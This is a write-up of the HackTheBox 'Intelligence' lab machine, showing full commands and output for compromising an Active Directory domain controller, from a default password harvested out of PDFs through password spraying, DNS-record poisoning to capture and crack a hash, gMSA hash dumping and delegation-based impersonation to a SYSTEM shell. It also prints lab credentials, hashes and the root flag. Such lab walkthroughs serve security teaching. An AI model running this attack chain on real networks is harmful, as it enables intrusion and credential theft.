---
title: Intelligence
categories: [HackTheBox]
tags: [Active Directory, AllowedToDelegate, BloodHound, PrivEsc, ReadGMSAPassword, Service Ticket, dnstool.py, GetST.py, krbrelayx, pdftotext]
media_subpath: /Vulnhub-Files/img/
image:
  path: Intelligence/Untitled.jpeg
  alt: Active Directory Medium level Machine 📂 ...
---



## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.10.248 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-14 16:35 IST
Nmap scan report for 10.10.10.248
Host is up (0.11s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-14 18:11:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-14T18:13:31+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-14T18:13:32+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2024-01-14T18:13:32+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2024-01-14T18:13:32+00:00; +7h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
50908/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2024-01-14T18:12:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
{: .nolineno}

## Web Enumeration ⤵️

I checked port 80 and I got this site →

![Untitled](Intelligence/Untitled.png)

I can access some pdf files from this site like this →

![Untitled](Intelligence/Untitled%201.png)

with name `/documents/2020-01-01-upload.pdf` to `/documents/2020-12-15-upload.pdf` so for sake of enumeration I have download all the pdf file from the starting date to ending date pdfs.

For that I created a bash script file that will generate a wordlist of these dates with file name in it into a file →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ cat date-wordlist.sh 
#!/bin/bash

start_date="2020-01-01"
end_date="2020-12-15"

current_date="$start_date"
echo "$current_date-upload.pdf"
while [[ "$current_date" != "$end_date" ]]; do
  current_date=$(date -I -d "$current_date + 1 day")
  filename=$current_date"-upload.pdf";
  echo "$filename" 
done

echo "$end_date-upload.pdf"
```
{: .nolineno}

I got this filenames.txt file so lets try to access some 200 status of files and its content downloaded on our attacker machine.

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ ./date-wordlist.sh > filename.txt
                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ ffuf -u http://intelligence.htb/documents/FUZZ -w filename.txt -o accessible_files.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://intelligence.htb/documents/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Downloads/HTB/Intelligence/filename.txt
 :: Output file      : accessible_files.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

2020-01-20-upload.pdf   [Status: 200, Size: 11632, Words: 157, Lines: 127, Duration: 297ms]
2020-01-22-upload.pdf   [Status: 200, Size: 28637, Words: 236, Lines: 224, Duration: 293ms]
2020-01-30-upload.pdf   [Status: 200, Size: 26706, Words: 242, Lines: 193, Duration: 216ms]
2020-01-10-upload.pdf   [Status: 200, Size: 26400, Words: 232, Lines: 205, Duration: 391ms]
2020-02-17-upload.pdf   [Status: 200, Size: 11228, Words: 167, Lines: 132, Duration: 132ms]
2020-02-28-upload.pdf   [Status: 200, Size: 11543, Words: 167, Lines: 131, Duration: 163ms]
2020-01-25-upload.pdf   [Status: 200, Size: 26252, Words: 225, Lines: 193, Duration: 385ms]
2020-03-13-upload.pdf   [Status: 200, Size: 24888, Words: 213, Lines: 204, Duration: 125ms]
...
...
```
{: .nolineno}

Now I saved these output into a file called `accessible_files.txt` so lets short it into another file →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ for i in $(seq 1 80);do cat accessible_files.txt| jq ".results.[$i].url";done | sed 's/"//g' > files.txt
                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ cat files.txt
http://intelligence.htb/documents/2020-01-20-upload.pdf
http://intelligence.htb/documents/2020-02-17-upload.pdf
http://intelligence.htb/documents/2020-01-30-upload.pdf
...
...
```
{: .nolineno}

Now download time →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ for i in $(cat files.txt); do wget $i;done                                                              
--2024-01-15 15:35:08--  http://intelligence.htb/documents/2020-01-20-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.10.10.248
Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11632 (11K) [application/pdf]
Saving to: ‘2020-01-20-upload.pdf’

2020-01-20-upload.pdf                100%[====================================================================>]  11.36K  --.-KB/s    in 0.08s   

2024-01-15 15:35:09 (139 KB/s) - ‘2020-01-20-upload.pdf’ saved [11632/11632]

--2024-01-15 15:35:09--  http://intelligence.htb/documents/2020-02-17-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.10.10.248
Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11228 (11K) [application/pdf]
Saving to: ‘2020-02-17-upload.pdf’

2020-02-17-upload.pdf                100%[====================================================================>]  10.96K  --.-KB/s    in 0.08s   

2024-01-15 15:35:09 (139 KB/s) - ‘2020-02-17-upload.pdf’ saved [11228/11228]
...
...
```
{: .nolineno}

I got all the files downloaded lets enumerate the values of each files with any uniqueness values in it →

I can see some Creators value from `exiftool` Tool inspection →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ exiftool 2020-01-02-upload.pdf
ExifTool Version Number         : 12.70
File Name                       : 2020-01-02-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 22:30:00+05:30
File Access Date/Time           : 2024:01:15 18:29:35+05:30
File Inode Change Date/Time     : 2024:01:15 15:35:12+05:30
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Scott.Scott
```
{: .nolineno}

Likewise I think all pdf’s may have a new creator so lets extract that from them and put it in a file →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ exiftool *.pdf | grep Creator                      
Creator                         : Mozilla Firefox 115.6.0
Creator                         : Scott.Scott
Creator                         : Jason.Wright
Creator                         : Veronica.Patel
Creator                         : Jennifer.Thomas
Creator                         : Danny.Matthews
Creator                         : Stephanie.Young
Creator                         : Daniel.Shelton
Creator                         : Jose.Williams
Creator                         : John.Coleman
Creator                         : Jason.Wright
Creator                         : Jose.Williams
Creator                         : Daniel.Shelton
Creator                         : Brian.Morris
Creator                         : Jennifer.Thomas
Creator                         : Thomas.Valenzuela
Creator                         : Travis.Evans
..
...
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ exiftool *.pdf | grep Creator | awk '{ print $3 }' > username.txt
```
{: .nolineno}

Now I have a wordlist of usernames so lets enumerate some values for passwords also in pdfs for that I think I have to look into the content of these pdfs but If I cat these pdfs I will get some junk values so.

I have to convert the pdf files into txt file to make the content readable so for that I user a tool called `pdftotext` Tool. That will convert the pdf files into text files like this →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ for i in $(ls *.pdf);do pdftotext $i;done
```
{: .nolineno}

I got all the pdf files into .txt files →

![Untitled](Intelligence/Untitled%202.png)

Now lets search for password and I got something also →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ grep -R password -A5 -B5
2020-06-04-upload.txt-New Account Guide
2020-06-04-upload.txt-Welcome to Intelligence Corp!
2020-06-04-upload.txt:Please login using your username and the default password of:
2020-06-04-upload.txt-NewIntelligenceCorpUser9876
2020-06-04-upload.txt:After logging in please change your password as soon as possible.
2020-06-04-upload.txt-
2020-06-04-upload.txt-
```
{: .nolineno}

I got this password from file `2020-06-04-upload.txt` .

```bash
NewIntelligenceCorpUser9876
```
{: .nolineno}

So I have some users and a password so lets brute force a service lets see if any user matches this →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ crackmapexec smb 10.10.10.248 -u username.txt -p 'NewIntelligenceCorpUser9876' --shares
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Mozilla:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```
{: .nolineno}

![Untitled](Intelligence/Untitled%203.png)

I got one user `intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876` .

I looked inside these shares and I got this →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ smbclient //10.10.10.248/IT -U 'intelligence.htb\Tiffany.Molina'
Password for [INTELLIGENCE.HTB\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 19 06:20:55 2021
  ..                                  D        0  Mon Apr 19 06:20:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 06:20:55 2021

		3770367 blocks of size 4096. 1458847 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \> exit
                                                                                                                                                  
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ smbclient //10.10.10.248/Users -U 'intelligence.htb\Tiffany.Molina'
Password for [INTELLIGENCE.HTB\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Mon Apr 19 06:50:26 2021
  ..                                 DR        0  Mon Apr 19 06:50:26 2021
  Administrator                       D        0  Mon Apr 19 05:48:39 2021
  All Users                       DHSrn        0  Sat Sep 15 12:51:46 2018
  Default                           DHR        0  Mon Apr 19 07:47:40 2021
  Default User                    DHSrn        0  Sat Sep 15 12:51:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 12:41:27 2018
  Public                             DR        0  Mon Apr 19 05:48:39 2021
  Ted.Graves                          D        0  Mon Apr 19 06:50:26 2021
  Tiffany.Molina                      D        0  Mon Apr 19 06:21:46 2021

		3770367 blocks of size 4096. 1458847 blocks available
smb: \>
```
{: .nolineno}

This file `downdetector.ps1` :

```powershell
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ cat downdetector.ps1                                                                   
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
{: .nolineno}

The above code is a PowerShell script designed to check the status of web servers. Here’s a breakdown of what it does:

1. `Import-Module ActiveDirectory`: This command imports the Active Directory module, which allows the script to interact with Active Directory objects.
2. `foreach($record in Get-ChildItem "AD:...")`: The script iterates over DNS records in Active Directory that start with “web”.
3. `try { ... } catch {}`: This is a try-catch block used to handle any exceptions that may occur during the execution of the code within the try block.
4. `$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials`: For each record, the script makes a web request to the corresponding URL using the default credentials of the user running the script.
5. `if($request.StatusCode -ne 200) { ... }`: If the HTTP status code returned is not 200 (OK), indicating that the web server is not responding properly, the script sends an email.
6. `Send-MailMessage ...`: This command sends an email to ‘Ted Graves’ with the subject indicating which host is down.

The script is scheduled to run every 5 minutes, as indicated by the comment at the top. It’s a monitoring script to ensure web servers are functioning correctly and to alert the administrator if any server goes down.

Since this script is iterating over a DNS record start with “web” , so I know a Tool that will include a DNS record into this Active directory machine with LDAP.

**[dnstool.py](http://dnstool.py) that work on [krbrelayx](https://github.com/dirkjanm/krbrelayx) via LDAP.**

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ python3 /opt/Tools/krbrelayx/dnstool.py -u intelligence.htb\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-Strong --data 10.10.16.29 --type A 10.10.10.248    
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
{: .nolineno}

- `-u intelligence\\Tiffany.Molina` - The user to authenticate as;
- `-p NewIntelligenceCorpUser9876` - The user’s password;
- `--action add` - Adding a new record;
- `--record web-Strong` - The domain to add;
- `--data 10.10.16.29` - The data to add, in this case, the IP to resolve web-Strong to;
- `--type A` - The type of record to add.

Lets check if my system means Attacker machine is a part of that DNS record or not through `nslookup` tool →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ nslookup
> server intelligence.htb
Default server: intelligence.htb
Address: 10.10.10.248#53
> web-Strong
Server:		intelligence.htb
Address:	10.10.10.248#53

** server can not find web-Strong: SERVFAIL
```
{: .nolineno}

So It seams we are on the right track so according to `downdetector.ps1` script lets capture some data send to Ted Graves user with responder →

![Untitled](Intelligence/Untitled%204.png)

![Untitled](Intelligence/Untitled%205.png)

Now I got the TGT ticket so lets crack it with john or hashcat what ever you like I like both so I will be using john here →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=netntlmv2
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)     
1g 0:00:00:09 DONE (2024-01-15 20:35) 0.1092g/s 1181Kp/s 1181Kc/s 1181KC/s Mrz.deltasigma..Mr BOB
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
{: .nolineno}

```bash
intelligence\Ted.Graves : Mr.Teddy
```
{: .nolineno}

Now you now the password so lets use this password to access some service →

![Untitled](Intelligence/Untitled%206.png)

Only new thing was to have access over IPC$ default share so lets move on to bloodhound now →

![Untitled](Intelligence/Untitled%207.png)

Lets see the shortest path to domain admin →

![Untitled](Intelligence/Untitled%208.png)

Now lets abuse **ReadGMSAPassword** delegation **→**

SVC_INT$@INTELLIGENCE.HTB is a Group Managed Service Account. The group ITSUPPORT@INTELLIGENCE.HTB can retrieve the password for the GMSA SVC_INT$@INTELLIGENCE.HTB.

Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval (check the `MSDS-ManagedPasswordInterval` attribute).

The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.

I used [gMSADumper](https://github.com/micahvandeusen/gMSADumper) →

```bash
┌──(kali㉿kali)-[/opt/Tools/gMSADumper]
└─$ python3 gMSADumper.py -d intelligence.htb -u Ted.Graves -p 'Mr.Teddy'                     
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::e0dcda8d93bf71a6352ea7803c8f17f1
svc_int$:aes256-cts-hmac-sha1-96:fd6235dbfd8a560d17433b22022633ed7188588277cf4d174f6582daf2c5333f
svc_int$:aes128-cts-hmac-sha1-96:059ae234e725682d00c3c278b3cff01b
```
{: .nolineno}

I got the `svc_int` `ntlm hash` so lets proceed further and now I have **AllowedToDelegate** Delegation means I can have a silver ticket made so lets create it →

![Untitled](Intelligence/Untitled%209.png)

I will be using `getST.py` from impackets library from inbuild stored in kali machine so lets Impersonate Administrator here →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ /usr/share/doc/python3-impacket/examples/getST.py -spn www/dc.intelligence.htb -dc-ip 10.10.10.248 -impersonate Administrator intelligence.htb/svc_int -hashes :e0dcda8d93bf71a6352ea7803c8f17f1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
{: .nolineno}

- `dc-ip 10.10.10.248` - domain controller IP
- `spn www/dc.intelligence.htb` - the SPN (Service Principle Name)
- `hashes :5e47bac787e5e1970cf9acdb5b316239` - the NTLM I collected earlier
- `impersonate administrator` - the user I want a ticket for
- `intelligence.htb/svc_int` - the account I’m running

I got this clock skew too great error so to adjust the time of our machine to the victim machine I have to use this tool `ntpdate` and also If you are running this attacker machine from `virtual box` you have to stop this service because it takes back 30 seconds.

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ sudo ntpdate 10.10.10.248 
2024-01-16 06:46:37.291394 (+0530) +28802.729696 +/- 0.040950 10.10.10.248 s1 no-leap
CLOCK: time stepped by 28802.729696
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ sudo service virtualbox-guest-utils stop
```
{: .nolineno}

Now lets again try that service ticket command →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ /usr/share/doc/python3-impacket/examples/getST.py -spn www/dc.intelligence.htb -dc-ip 10.10.10.248 -impersonate Administrator intelligence.htb/svc_int -hashes :e0dcda8d93bf71a6352ea7803c8f17f1
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```
{: .nolineno}

This time I got the `kerbrute ticket` in this `Administrator.ccache` file so lets export it to the variable and access the administrator now with no password →

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ export KRB5CCNAME=Administrator.ccache

┌──(kali㉿kali)-[~/Downloads/HTB/Intelligence]
└─$ psexec.py -k -no-pass Administrator@dc.intelligence.htb 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file VThHSqiz.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service fTtB on dc.intelligence.htb.....
[*] Starting service fTtB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
dc

C:\Windows\system32> cd C:\Users\ADminisitrator
The system cannot find the path specified.

C:\Users\Administrator> tree /f /a
Folder PATH listing
Volume serial number is E3EF-EBBD
C:.
+---3D Objects
+---Contacts
+---Desktop
|       root.txt
|       
+---Documents
|   \---WindowsPowerShell
|       \---Scripts
|           \---InstalledScriptInfos
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos

C:\Users\Administrator> type Desktop\root.txt
3b69d7328bd6b1ff7700a2ca03a5ac48

C:\Users\Administrator>
```
{: .nolineno}

I am Domain Admin Now !!

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }